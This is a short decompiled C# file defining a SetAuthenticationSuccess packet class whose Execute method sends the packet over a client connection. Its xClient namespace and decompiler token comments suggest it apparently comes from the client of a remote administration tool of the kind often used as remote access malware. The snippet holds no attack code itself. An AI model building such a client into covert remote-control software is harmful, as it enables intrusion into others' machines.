using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
	// Token: 0x02000045 RID: 69
	[Serializable]
	public class SetAuthenticationSuccess : IPacket
	{
		// Token: 0x060001D1 RID: 465 RVA: 0x00002DC1 File Offset: 0x00000FC1
		public void Execute(Client client)
		{
			client.Send<SetAuthenticationSuccess>(this);
		}
	}
}
